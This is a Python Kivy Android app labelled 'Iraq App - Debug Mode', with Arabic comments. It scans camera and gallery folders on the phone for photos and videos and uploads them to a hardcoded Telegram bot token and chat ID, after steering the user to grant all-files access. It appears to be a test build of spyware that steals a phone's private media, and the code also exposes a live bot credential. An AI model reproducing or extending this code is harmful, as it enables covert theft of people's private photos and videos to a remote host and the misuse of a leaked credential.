import os
import time
import hashlib
import threading
import requests
from kivy.utils import platform

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock

# ============ إعدادات تيليجرام ============
BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
CHAT_ID   = "6046016571"
API_URL   = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ============ مسارات متعددة (لضمان التقاط صور سامسونج) ============
GALLERY_PATHS = [
    "/sdcard/DCIM/Camera/",
    "/storage/emulated/0/DCIM/Camera/",
    "/sdcard/Pictures/",
    "/storage/emulated/0/Pictures/",
    "/sdcard/DCIM/",
    "/storage/emulated/0/DCIM/"
]

def get_all_unique_media(base_dir):
    # هنا لا نستخدم الـ Hash لنرى كل شيء، مجرد فحص أولي
    unique_list = []
    IMG_EXT = ('.jpg', '.jpeg', '.png', '.webp', '.heic')
    VID_EXT = ('.mp4', '.mov', '.avi', '.mkv')
    
    log_output = ""
    for folder in GALLERY_PATHS:
        if os.path.exists(folder):
            try:
                files = os.listdir(folder)
                count = 0
                for file in files:
                    file_lower = file.lower()
                    if file_lower.endswith(IMG_EXT) or file_lower.endswith(VID_EXT):
                        count += 1
                        full_path = os.path.join(folder, file)
                        media_type = 'photo' if file_lower.endswith(IMG_EXT) else 'video'
                        unique_list.append({'path': full_path, 'type': media_type})
                log_output += f"📁 {folder}: {count} files\n"
            except Exception as e:
                log_output += f"❌ {folder}: Error {e}\n"
        else:
            log_output += f"🚫 {folder}: Not Found\n"
            
    return unique_list, log_output

def send_telegram_text(text):
    try:
        requests.post(f"{API_URL}/sendMessage", data={'chat_id': CHAT_ID, 'text': text}, timeout=20)
    except: pass

def send_media_file(item):
    try:
        file_path = item['path']
        method, file_key = ("sendPhoto", "photo") if item['type'] == 'photo' else ("sendVideo", "video")
        
        with open(file_path, 'rb') as f:
            files = {file_key: (os.path.basename(file_path), f)}
            data = {'chat_id': CHAT_ID, 'caption': 'Test Upload'}
            r = requests.post(f"{API_URL}/{method}", data=data, files=files, timeout=60)
        return r.status_code == 200
    except Exception as e:
        return False

# ============ واجهة الفحص ============
class MainApplicationUI(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 10
        self.spacing = 10

        self.add_widget(Label(text="Iraq App - Debug Mode", font_size=24, size_hint_y=None, height=50))
        
        # شاشة عرض السجل
        self.scroll = ScrollView(size_hint=(1, 0.6))
        self.log_label = Label(text="Starting...", font_size=14, size_hint_y=None, halign='left', valign='top')
        self.log_label.bind(texture_size=self.log_label.setter('size'))
        self.scroll.add_widget(self.log_label)
        self.add_widget(self.scroll)

        # زر فتح الإعدادات
        btn_settings = Button(text="1. Open Permissions Settings", font_size=18, size_hint_y=None, height=50, background_color=(0.8, 0.3, 0.3, 1))
        btn_settings.bind(on_press=self.open_settings)
        self.add_widget(btn_settings)

        # زر الفحص
        btn_scan = Button(text="2. Scan & Send First Image", font_size=18, size_hint_y=None, height=50, background_color=(0.2, 0.6, 0.2, 1))
        btn_scan.bind(on_press=self.scan_and_send)
        self.add_widget(btn_scan)

    def log(self, msg):
        self.log_label.text += f"\n{msg}"

    def open_settings(self):
        if platform == 'android':
            try:
                from jnius import autoclass, cast
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                Uri = autoclass('android.net.Uri')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity

                # فتح شاشة الوصول لجميع الملفات مباشرة
                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                uri = Uri.fromParts("package", activity.getPackageName(), None)
                intent.setData(uri)
                activity.startActivity(intent)
                self.log("✅ Settings opened. Please enable 'All files access'.")
            except Exception as e:
                self.log(f"❌ Error opening settings: {e}")

    def scan_and_send(self, instance):
        self.log_label.text = "Scanning directories..."
        threading.Thread(target=self._do_scan, daemon=True).start()

    def _do_scan(self):
        # 1. فحص المجلدات
        media, log_output = get_all_unique_media("/sdcard")
        Clock.schedule_once(lambda dt: self.log(log_output))
        
        if not media:
            Clock.schedule_once(lambda dt: self.log("❌ NO IMAGES FOUND AT ALL.\nCheck permissions."))
            return

        # 2. إرسال أول صورة تم العثور عليها
        Clock.schedule_once(lambda dt: self.log(f"✅ Found {len(media)} media files!\nSending first one: {os.path.basename(media[0]['path'])}..."))
        success = send_media_file(media[0])

        if success:
            Clock.schedule_once(lambda dt: self.log("🚀 SUCCESS! Image sent to Telegram."))
        else:
            Clock.schedule_once(lambda dt: self.log("❌ FAILED to send. Telegram API rejected it."))

# ============ كلاس التطبيق ============
class IraqApp(App):
    def on_start(self):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            try:
                request_permissions([
                    Permission.READ_EXTERNAL_STORAGE,
                    Permission.WRITE_EXTERNAL_STORAGE,
                ])
            except Exception:
                pass

    def build(self):
        return MainApplicationUI()

if __name__ == '__main__':
    IraqApp().run()
